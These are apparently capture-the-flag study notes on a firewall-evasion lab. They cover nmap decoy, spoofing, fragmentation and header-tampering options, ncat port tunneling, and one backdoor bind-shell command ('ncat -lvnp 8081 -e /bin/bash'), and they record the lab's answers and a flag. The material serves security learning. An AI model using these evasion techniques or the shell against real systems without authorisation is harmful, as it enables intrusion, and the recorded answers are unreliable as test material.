# Firewalls - Medium

1. [Introduction](#introduction)
2. [Types of Firewalls](#types-of-firewalls)
3. [Evasion via Controlling the Source MAC/IP/Port](#evasion-via-controlling-the-source-macipport)
4. [Evasion via Forcing Fragmentation, MTU, and Data Length](#evasion-via-forcing-fragmentation-mtu-and-data-length)
5. [Evasion via Modifying Header Fields](#evasion-via-modifying-header-fields)
6. [Evasion using Port Hopping](#evasion-using-port-hopping)
7. [Evasion using Port Tunneling](#evasion-using-port-tunneling)
8. [Evasion using Non-Standard Ports](#evasion-using-non-standard-ports)
9. [Next-Generation Firewalls](#next-generation-firewalls)

## Introduction

* Firewall - software/hardware that monitors network traffic and compares it against rules before passing/blocking it.

* A basic firewall can inspect certain fields from an IP header, such as:

  * Protocol
  * Source address
  * Source port number
  * Destination address
  * Destination port number

```markdown
1. If you want to block telnet, which TCP port number would you deny? - 23

2. You want to allow HTTPS, which TCP port number do you need to permit? - 443

3. What is an alternate TCP port number used for HTTP? It is described as “HTTP Alternate.” - 8080

4. You need to allow SNMP over SSH, snmpssh. Which port should be permitted? - 5161
```

## Types of Firewalls

* Types of firewalls based on independence:

  * Hardware firewall
  * Software firewall

* Types of firewalls based on network size:

  * Personal firewall
  * Commercial firewall

* Types of firewalls based on abilities:

  * Packet-filtering firewall - most basic type of firewall as it inspects packet field contents; stateless inspection firewall.

  * Circuit-level gateway - in addition to packet-filtering firewall's features, these gateways provide extra features such as checking TCP 3-way handshake against firewall rules.

  * Stateful inspection firewall - additional layer of security as it keeps track of established TCP sessions.

  * Proxy firewall - also referred to as Application firewall (AF) and Web application firewall (WAF); it can inspect contents of packet headers as well as packet payload; used mainly for web apps.

  * Next-generation firewall (NGFW) - offers highest firewall protection; monitors all network layers (OSI layer 2 to 7); has application awareness and control.

  * Cloud firewall or Firewall as a Service (FWaaS) - replaces hardware firewall in cloud system; benefits from scalability of cloud architecture.

```markdown
1. What is the most basic type of firewall? - Packet-filtering firewall

2. What is the most advanced type of firewall that you can have on company premises? - Next-generation firewall
```

## Evasion via Controlling the Source MAC/IP/Port

```shell
nmap -sS -Pn -F MACHINE_IP
#-sS is for stealth scan
#-Pn is to skip host discovery; used when no ping reply is received
#-F is for scanning top 100 common ports

nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP
#-D for using decoy source IP addresses to confuse target
#ME is the source IP address running the scan

nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP
#choose 2 random source IPs to use as decoys

nmap -sS -Pn --proxies PROXY_URL -F MACHINE_IP
#uses HTTP/SOCKS4 proxy
#helps in keeping our IP adress unknown to target
#target logs IP of proxy server

nmap -sS --spoof-mac MAC_ADDRESS -F MACHINE_IP
#spoofs source MAC address
#works only if our system is on same network segment as target host

nmap -sS -S IP_ADDRESS -F MACHINE_IP
#spoofs source IP address
#useful if system is on same subnet as target

nmap -sS -Pn -g 8080 -F MACHINE_IP
#nmap scan with fixed source port 8080
```

```markdown
1. What is the size of the IP packet when using a default Nmap stealth (SYN) scan? - 44

2. How many bytes does the TCP segment hold in its data field when using a default Nmap stealth (SYN) scan? - 0

3. Approximately, how many packets do you expect Nmap to send when running the command nmap -sS -F MACHINE_IP? - 200

4. Approximately, how many packets do you expect Nmap to send when running the command nmap -sS -Pn -D RND,10.10.55.33,ME,RND -F MACHINE_IP? - 800

5. What do you expect the target to see as the source of the scan when you run the command nmap -sS -Pn --proxies 10.10.13.37 MACHINE_IP? - 10.10.13.37

6. What company has registered the following Organizationally Unique Identifier (OUI), i.e., the first 24 bits of a MAC address, 00:02:DC? - Fujitsu General Ltd

7. What option needs to be added to your Nmap command to spoof your address accordingly? - -S 10.10.0.254

8. What do you need to add to your Nmap command to set the source port number to 53? - -g 53
```

## Evasion via Forcing Fragmentation, MTU, and Data Length

```shell
nmap -sS -Pn -f -F MACHINE_IP
#-f for fragmenting IP packet to carry only 8 bytes of data

nmap -sS -Pn -ff -F MACHINE_IP
#-ff for limiting IP data to 16 bytes

nmap -sS -Pn --mtu 8 -F MACHINE_IP
#mtu (max transmission unit) specifies number of bytes per IP packet
#--mtu 8 same as -f

nmap -sS -Pn --data-length 64 -F MACHINE_IP
#set length of data in IP packet
```

```markdown
1. What is the size of the IP packet when running Nmap with the -f option? - 28

2. What is the maximum size of the IP packet when running Nmap with the -ff option? - 36

3. What is the maximum size of the IP packet when running Nmap with --mtu 36 option? - 56

4. What is the maximum size of the IP packet when running Nmap with --data-length 128 option? - 148
```

## Evasion via Modifying Header Fields

```shell
nmap -sS -Pn --ttl 81 -F MACHINE_IP
#sets TTL (time-to-live) to custom value

nmap -sS -Pn -ttl 2 -F 10.10.225.183

nmap -sS -Pn --badsum -F 10.10.225.183
#send packets with intentionally wrong checksum
```

```markdown
1. Scan the attached MS Windows machine using --ttl 2 option. How many ports appear to be open? - 3

2. Scan the attached MS Windows machine using the --badsum option. How many ports appear to be open? - 0
```

## Evasion using Port Hopping

* Port hopping - app hops from one port to another till it can establish & maintain a connection.

```shell
ncat -lvnp 1025
#listening on port 1025
#we can use the given webpage to check which ports can be connected to
```

```markdown
1. Discover which port number of the following destination TCP port numbers are reachable from the protected system. - 21
```

## Evasion using Port Tunneling

* Port tunneling - also known as port forwarding or port mapping; this forwards packets sent to one destination port to another destination port.

```shell
ncat -lvnp 443 -c "ncat MACHINE_IP 25"
#ncat will listen on port 443
#but it will forward all packets to port 25 on target

ncat -lvnp 8008 -c "ncat localhost 80"
#for flag, go to the web server hosted on port 8008
```

```markdown
1. Using port tunneling, browse to the web server and retrieve the flag. -  THM{1298331956}
```

## Evasion using Non-Standard Ports

```shell
ncat -lvnp 8081 -e /bin/bash
#creates backdoor via port 8081

#on attacker machine
ncat 10.10.173.45 8081
#to connect to target
```

```markdown
1. What is the user name associated with which you are logged in? - thmredteam
```

## Next-Generation Firewalls

```markdown
1. What is the number of the highest OSI layer that an NGFW can process? - 7
```
